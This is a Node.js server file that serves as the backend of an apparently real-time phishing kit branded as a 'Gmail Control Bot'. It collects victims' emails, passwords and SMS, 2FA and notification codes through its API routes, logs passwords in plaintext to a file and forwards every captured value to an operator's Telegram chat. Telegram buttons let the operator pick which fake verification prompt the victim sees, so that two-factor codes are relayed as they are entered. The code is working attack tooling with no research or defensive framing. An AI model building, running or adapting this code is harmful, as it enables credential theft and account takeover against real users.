require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Store session data
const sessions = {};
let activeSessionId = null;

// Telegram Bot Configuration
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

console.log('🚀 Starting server...');

// ============================================
// TELEGRAM POLLING
// ============================================
let lastUpdateId = 0;

async function pollTelegram() {
    try {
        const url = `${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const response = await axios.get(url);
        
        if (response.data.ok && response.data.result.length > 0) {
            for (const update of response.data.result) {
                await handleTelegramUpdate(update);
                lastUpdateId = update.update_id;
            }
        }
    } catch (error) {
        console.error('❌ Polling error:', error.message);
    }
}

async function handleTelegramUpdate(update) {
    if (update.callback_query) {
        await handleCallbackQuery(update.callback_query);
        return;
    }
    
    const message = update.message;
    if (!message || !message.text) return;
    
    const text = message.text;
    const chatId = message.chat.id;
    
    if (chatId.toString() !== CHAT_ID) return;
    
    // /control - Auto uses latest session
    if (text === '/control' || text.startsWith('/control ')) {
        let sessionId = null;
        const parts = text.split(' ');
        
        if (parts.length === 2) {
            sessionId = parts[1];
            if (!sessions[sessionId]) {
                await sendToTelegram(`❌ Session not found`);
                return;
            }
        } else {
            if (activeSessionId && sessions[activeSessionId]) {
                sessionId = activeSessionId;
                await sendToTelegram(`✅ Controlling session: ${sessionId}`);
            } else {
                await sendToTelegram(`❌ No active session. Please open the webpage first.`);
                return;
            }
        }
        
        await sendControlButtons(sessionId);
        return;
    }
    
    // /sessions
    if (text === '/sessions') {
        const sessionList = Object.keys(sessions);
        if (sessionList.length === 0) {
            await sendToTelegram('📭 No active sessions');
        } else {
            await sendToTelegram(
                `📋 <b>Active Sessions:</b>\n\n` +
                `${sessionList.map(id => `• ${id} ${id === activeSessionId ? '⭐ (active)' : ''}`).join('\n')}`
            );
        }
        return;
    }
    
    // /status
    if (text === '/status') {
        if (activeSessionId && sessions[activeSessionId]) {
            const session = sessions[activeSessionId];
            await sendToTelegram(
                `📊 <b>Session Status</b>\n\n` +
                `ID: ${activeSessionId}\n` +
                `Email: ${session.email || 'Not entered'}\n` +
                `Password: ${session.password ? '✅ Entered' : 'Not entered'}\n` +
                `Step: ${session.step || 'Waiting'}`
            );
        } else {
            await sendToTelegram('📭 No active session');
        }
        return;
    }
    
    // Help
    await sendToTelegram(
        `🤖 <b>Gmail Control Bot</b>\n\n` +
        `<b>Commands:</b>\n` +
        `/control - Control the active session\n` +
        `/sessions - List all sessions\n` +
        `/status - Show session status\n\n` +
        `Just type <b>/control</b> to get started!`
    );
}

async function handleCallbackQuery(callbackQuery) {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    
    if (chatId.toString() !== CHAT_ID) return;
    
    const [sessionId, command] = data.split('|');
    
    if (!sessions[sessionId]) {
        await answerCallbackQuery(callbackQuery.id, '❌ Session expired!');
        return;
    }
    
    sessions[sessionId].command = command;
    sessions[sessionId].promptType = command;
    console.log(`✅ Command ${command} set for session ${sessionId}`);
    
    await answerCallbackQuery(callbackQuery.id, `✅ ${command} sent!`);
    
    await editMessageText(chatId, messageId, 
        `✅ <b>Command: ${command}</b>\nSession: ${sessionId}\n\nWebsite is responding...`
    );
}

async function sendControlButtons(sessionId) {
    const session = sessions[sessionId];
    const email = session?.email || 'Not entered';
    const password = session?.password ? '••••••••' : 'Not entered';
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: '📱 Phone Number', callback_data: `${sessionId}|phone` },
                { text: '✉️ SMS Code', callback_data: `${sessionId}|sms` }
            ],
            [
                { text: '🔐 2FA Code', callback_data: `${sessionId}|2fa` },
                { text: '🔔 Notification', callback_data: `${sessionId}|notification` }
            ],
            [
                { text: '✅ Success Page', callback_data: `${sessionId}|success` }
            ]
        ]
    };
    
    const message = 
        `🎬 <b>Control Panel</b>\n\n` +
        `<b>Session:</b> ${sessionId}\n` +
        `<b>Email:</b> ${email}\n` +
        `<b>Password:</b> ${password}\n\n` +
        `<b>Choose what to show:</b>`;
    
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    } catch (error) {
        console.error('❌ Failed to send buttons:', error.message);
    }
}

async function sendToTelegram(message) {
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

async function answerCallbackQuery(callbackQueryId, text) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text,
            show_alert: false
        });
    } catch (error) {
        console.error('❌ Answer callback error:', error.message);
    }
}

async function editMessageText(chatId, messageId, text) {
    try {
        await axios.post(`${TELEGRAM_API}/editMessageText`, {
            chat_id: chatId,
            message_id: messageId,
            text: text,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('❌ Edit message error:', error.message);
    }
}

setInterval(pollTelegram, 2000);

// ============================================
// API ROUTES
// ============================================

app.post('/api/visit', async (req, res) => {
    const sessionId = Date.now().toString();
    activeSessionId = sessionId;
    
    sessions[sessionId] = { 
        step: 'visited', 
        command: null,
        promptType: null,
        email: null,
        password: null,
        verificationData: null,
        createdAt: new Date().toISOString()
    };
    
    console.log(`🌐 New visit: ${sessionId}`);
    await sendToTelegram(
        `🌐 <b>Page Visited!</b>\n\n` +
        `Session: ${sessionId}\n` +
        `Type <b>/control</b> to control this session!`
    );
    
    res.json({ sessionId });
});

app.post('/api/email', async (req, res) => {
    const { sessionId, email } = req.body;
    
    if (sessions[sessionId]) {
        sessions[sessionId].email = email;
        sessions[sessionId].step = 'email_received';
        activeSessionId = sessionId;
    }
    
    await sendToTelegram(`📧 <b>Email:</b> ${email}\nSession: ${sessionId}`);
    res.json({ success: true });
});

app.post('/api/password', async (req, res) => {
    const { sessionId, password } = req.body;
    
    if (sessions[sessionId]) {
        sessions[sessionId].password = password;
        sessions[sessionId].step = 'password_received';
        activeSessionId = sessionId;
        
        const logEntry = `[${new Date().toISOString()}] Session: ${sessionId} | Email: ${sessions[sessionId].email || 'N/A'} | Password: ${password}\n`;
        fs.appendFileSync('credentials.log', logEntry);
    }
    
    await sendToTelegram(
        `🔑 <b>Password Entered!</b>\n\n` +
        `Session: ${sessionId}\n` +
        `Email: ${sessions[sessionId]?.email || 'N/A'}\n` +
        `Password: ${password}\n\n` +
        `Type <b>/control</b> to control this session!`
    );
    
    res.json({ success: true });
});

app.get('/api/command/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    
    if (!sessions[sessionId]) {
        return res.json({ command: null, promptType: null });
    }
    
    const command = sessions[sessionId].command;
    const promptType = sessions[sessionId].promptType;
    
    if (command) {
        sessions[sessionId].command = null;
        console.log(`📤 Sending: ${command} to ${sessionId}`);
    }
    
    res.json({ command, promptType });
});

app.post('/api/verify', async (req, res) => {
    const { sessionId, value, type } = req.body;
    
    if (sessions[sessionId]) {
        sessions[sessionId].verificationData = value;
        sessions[sessionId].step = 'verified';
        activeSessionId = sessionId;
    }
    
    await sendToTelegram(
        `✅ <b>Verification Submitted!</b>\n\n` +
        `Type: ${type}\n` +
        `Value: ${value}`
    );
    
    res.json({ success: true });
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        activeSession: activeSessionId,
        totalSessions: Object.keys(sessions).length
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Type /control in Telegram to control the session!`);
});
